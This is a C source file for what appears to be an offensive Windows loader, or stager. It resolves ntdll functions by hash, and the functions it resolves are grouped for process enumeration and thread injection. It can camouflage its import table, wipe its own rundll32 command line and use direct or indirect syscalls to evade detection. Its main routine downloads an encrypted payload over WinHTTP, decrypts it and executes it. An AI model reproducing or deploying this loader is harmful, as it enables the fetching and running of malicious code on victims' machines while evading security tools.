#include <Ldr.h>
#include <Config.h>
#include <common/Macros.h>
#include <common/Defines.h>
#include <core/MiniStd.h>
#include <core/Win32.h>
#include <core/Runtime.h>
#include <core/Syscalls.h>
#include <core/SysNative.h>
#include <core/Payload.h>
#include <exec/Execute.h>
#include <core/IatCamo.h>

#include <common/Debug.h>


/* Global Variables */
#pragma data_seg( push, data, ".data" )
SEC_DATA PINSTANCE Instance = { 0 };
#pragma data_seg( pop )


VOID
LdrMain( 
    PVOID DllBase
) {
    DBGDLLINIT()

#if ( defined( IAT_CAMOUFLAGE ) && ( IAT_CAMOUFLAGE == TRUE ) )
    IatCamouflage();
#endif // IAT_CAMOUFLAGE == TRUE

    LdrInit();

    LdrRoutine();

    DBGDLLEXIT()
}


// https://learn.microsoft.com/en-us/cpp/error-messages/compiler-warnings/compiler-warning-level-4-c4152
#pragma warning( disable : 4152 )
VOID
LdrInit( 
    VOID
) {
    static INSTANCE Inst = { 0 };
    Instance = & Inst;

    Instance->Teb        = NtCurrentTeb();

#if defined ( EXEC_RUNDLL32 ) && ( EXEC_RUNDLL32 == TRUE )
    RtlSecureZeroMemory( 
        Instance->Teb->ProcessEnvironmentBlock->ProcessParameters->CommandLine.Buffer, 
        Instance->Teb->ProcessEnvironmentBlock->ProcessParameters->CommandLine.MaximumLength
    );
#endif // EXEC_RUNDLL32 == TRUE

    //
    // load functions from ntdll
    //
    if ( ( Instance->Modules.NtDll = LdrGetModuleBase( H_DLL( NTDLL ) ) ) ) 
    {
        /* Module & Function Address Loading */
        Instance->NtDll.LdrLoadDll             = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( LdrLoadDll ) );
        Instance->NtDll.LdrGetProcedureAddress = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( LdrGetProcedureAddress ) );

        /* Rtl Functions for Rt Memory Management */
        Instance->NtDll.RtlAllocateHeap   = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( RtlAllocateHeap ) );
        Instance->NtDll.RtlReAllocateHeap = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( RtlReAllocateHeap ) );
        Instance->NtDll.RtlFreeHeap       = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( RtlFreeHeap ) );

        /* Process and Thread Enumeration */
        Instance->NtDll.NtQuerySystemInformation = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtQuerySystemInformation ) );
        Instance->NtDll.NtOpenProcess            = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtOpenProcess ) );

        /* Process and Thread Injection */
        Instance->NtDll.NtAllocateVirtualMemory = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtAllocateVirtualMemory ) );
        Instance->NtDll.NtWriteVirtualMemory    = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtWriteVirtualMemory ) );
        Instance->NtDll.NtProtectVirtualMemory  = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtProtectVirtualMemory ) );
        Instance->NtDll.NtCreateThreadEx        = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtCreateThreadEx ) );
        Instance->NtDll.NtGetContextThread      = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtGetContextThread ) );
        Instance->NtDll.NtSetContextThread      = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtSetContextThread ) );
        Instance->NtDll.NtResumeThread          = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtResumeThread ) );
        Instance->NtDll.NtWaitForSingleObject   = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtWaitForSingleObject ) );

        Instance->NtDll.NtTerminateThread       = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtTerminateThread ) );
        Instance->NtDll.NtTerminateProcess      = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtTerminateProcess ) );
        Instance->NtDll.NtClose                 = LdrGetFuncAddr( Instance->Modules.NtDll, H_API( NtClose ) );

    } else {
        PUTS( "Failed to load NTDLL from PEB" )
        return;
    }

    //
    // load win32u
    //
#if ( defined( SYS_INDIRECT_WIN32U ) && ( SYS_INDIRECT_WIN32U == TRUE ) )
    if ( ( Instance->Modules.Win32u = LdrGetModuleBase( H_DLL( WIN32U ) ) ) ) {
        PUTS( "[+] Loaded Win32u from PEB" )
    } else {
        PUTS( "[-] Failed to load Win32u from PEB" )

        if ( ! RtWin32u() ) {
            return;
        }
    }
#endif // SYS_INDIRECT_WIN32U == TRUE

    //
    // load functions from winhttp
    //
    if ( ! RtWinHttp() ) {
        return;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#if ( defined ( SYS_SYSCALLS ) && ( SYS_SYSCALLS == TRUE ) )
    //
    // initialize syscalls -> get SSN for every syscall we need
    //
    if ( ! SysInitialize( Instance->Modules.NtDll ) ) {
        PUTS( "[-] SysInitialize failed. Falling back to use NTAPI" )
    }
#endif // SYS_SYSCALLS == TRUE

}


VOID
LdrRoutine( 
    VOID
) {
    BUFFER PayloadBuffer = { 0 };

    if ( ! DownloadPayload( & PayloadBuffer ) ) {
        PUTS( "[-] DownloadPayload failed. Aborting ..." )
        goto LEAVE;
    }
    PRINT_HEX( PayloadBuffer.Buffer, PayloadBuffer.Length )

#if ( defined( CRYPT ) && ( CRYPT == TRUE ) )
    DecryptPayload( & PayloadBuffer );
    PRINT_HEX( PayloadBuffer.Buffer, PayloadBuffer.Length )
#endif // CRYPT == TRUE
    
    if ( ! ExecutePayload( & PayloadBuffer ) ) {
        PUTS( "[-] ExecutePayload failed. Aborting ..." )
        goto LEAVE;
    }

LEAVE:
    RtlSecureZeroMemory( PayloadBuffer.Buffer, PayloadBuffer.Length );

    return;
}
